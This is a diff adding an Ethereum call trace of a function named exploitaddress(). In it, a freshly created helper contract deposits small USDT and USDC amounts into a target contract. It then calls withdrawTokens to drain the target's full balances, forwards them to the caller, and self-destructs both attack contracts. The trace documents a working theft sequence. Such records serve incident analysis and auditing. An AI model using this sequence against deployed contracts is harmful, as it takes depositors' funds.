@@ -1,0 +1,48 @@
+[1][CALL] from=0x7d9bc4, to=0xe897c0, exploitaddress() -> None
+  [2][CREATE] from=0xe897c0, to=0xa8c6e7, atInversebrahint248() -> 0x608060
+  [2][STATICCALL] from=0xe897c0, to=TetherToken, allowance(_owner(address): 0xE897C0, _spender(address): 0x319Ec3) -> 0
+  [2][CALL] from=0xe897c0, to=TetherToken, approve(_spender(address): 0x319Ec3, _value(uint256): 2000000) -> None
+  [2][CALL] from=0xe897c0, to=0x319ec3, depositTokensaddress() -> None
+    [3][CALL] from=0x319ec3, to=TetherToken, transferFrom(_from(address): 0xE897C0, _to(address): 0x319Ec3, _value(uint256): 2000000) -> None
+  [2][CALL] from=0xe897c0, to=0xa8c6e7, 0x42c59677() -> None
+    [3][CALL] from=0xa8c6e7, to=0x319ec3, 0x65e6115c() -> None
+  [2][CALL] from=0xe897c0, to=0x319ec3, 0xbafac6bd() -> None
+    [3][CALL] from=0x319ec3, to=TetherToken, transfer(_to(address): 0xE897C0, _value(uint256): 1000000) -> None
+  [2][CALL] from=0xe897c0, to=0xa8c6e7, 0x42c59677() -> None
+    [3][STATICCALL] from=0xa8c6e7, to=TetherToken, balanceOf(who(address): 0x319Ec3) -> 10335882398
+    [3][CALL] from=0xa8c6e7, to=0x319ec3, withdrawTokensaddress() -> None
+      [4][CALL] from=0x319ec3, to=TetherToken, transfer(_to(address): 0xA8c6E7, _value(uint256): 10335882398) -> None
+    [3][STATICCALL] from=0xa8c6e7, to=TetherToken, balanceOf(who(address): 0xA8c6E7) -> 10335882398
+    [3][CALL] from=0xa8c6e7, to=TetherToken, transfer(_to(address): 0xE897C0, _value(uint256): 10335882398) -> None
+  [2][STATICCALL] from=0xe897c0, to=FiatTokenProxy, allowance(owner(address): 0xE897C0, spender(address): 0x319Ec3) -> 0
+    [3][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, allowance(owner(address): 0xE897C0, spender(address): 0x319Ec3) -> 0
+  [2][CALL] from=0xe897c0, to=FiatTokenProxy, approve(spender(address): 0x319Ec3, value(uint256): 2000000) -> True
+    [3][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, approve(spender(address): 0x319Ec3, value(uint256): 2000000) -> True
+  [2][CALL] from=0xe897c0, to=0x319ec3, depositTokensaddress() -> None
+    [3][CALL] from=0x319ec3, to=FiatTokenProxy, transferFrom(from(address): 0xE897C0, to(address): 0x319Ec3, value(uint256): 2000000) -> True
+      [4][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, transferFrom(from(address): 0xE897C0, to(address): 0x319Ec3, value(uint256): 2000000) -> True
+  [2][CALL] from=0xe897c0, to=0xa8c6e7, 0x42c59677() -> None
+    [3][CALL] from=0xa8c6e7, to=0x319ec3, 0x65e6115c() -> None
+  [2][CALL] from=0xe897c0, to=0x319ec3, 0xbafac6bd() -> None
+    [3][CALL] from=0x319ec3, to=FiatTokenProxy, transfer(to(address): 0xE897C0, value(uint256): 1000000) -> True
+      [4][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, transfer(to(address): 0xE897C0, value(uint256): 1000000) -> True
+  [2][CALL] from=0xe897c0, to=0xa8c6e7, 0x42c59677() -> None
+    [3][STATICCALL] from=0xa8c6e7, to=FiatTokenProxy, balanceOf(account(address): 0x319Ec3) -> 6592359286
+      [4][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, balanceOf(account(address): 0x319Ec3) -> 6592359286
+    [3][CALL] from=0xa8c6e7, to=0x319ec3, withdrawTokensaddress() -> None
+      [4][CALL] from=0x319ec3, to=FiatTokenProxy, transfer(to(address): 0xA8c6E7, value(uint256): 6592359286) -> True
+        [5][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, transfer(to(address): 0xA8c6E7, value(uint256): 6592359286) -> True
+    [3][STATICCALL] from=0xa8c6e7, to=FiatTokenProxy, balanceOf(account(address): 0xA8c6E7) -> 6592359286
+      [4][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, balanceOf(account(address): 0xA8c6E7) -> 6592359286
+    [3][CALL] from=0xa8c6e7, to=FiatTokenProxy, transfer(to(address): 0xE897C0, value(uint256): 6592359286) -> True
+      [4][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, transfer(to(address): 0xE897C0, value(uint256): 6592359286) -> True
+  [2][STATICCALL] from=0xe897c0, to=TetherToken, balanceOf(who(address): 0xE897C0) -> 10339882398
+  [2][CALL] from=0xe897c0, to=TetherToken, transfer(_to(address): 0x7d9bC4, _value(uint256): 10339882398) -> None
+  [2][STATICCALL] from=0xe897c0, to=FiatTokenProxy, balanceOf(account(address): 0xE897C0) -> 6596359286
+    [3][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, balanceOf(account(address): 0xE897C0) -> 6596359286
+  [2][CALL] from=0xe897c0, to=FiatTokenProxy, transfer(to(address): 0x7d9bC4, value(uint256): 6596359286) -> True
+    [3][DELEGATECALL] from=FiatTokenProxy, to=FiatTokenV2_1, transfer(to(address): 0x7d9bC4, value(uint256): 6596359286) -> True
+  [2][CALL] from=0xe897c0, to=0xa8c6e7, killMe() -> None
+    [3][SELFDESTRUCT][0.0] from=0xa8c6e7, to=0xe897c0
+  [2][CALL] from=0xe897c0, to=0xe897c0, killMe() -> None
+    [3][SELFDESTRUCT][0.0] from=0xe897c0, to=0x7d9bc4
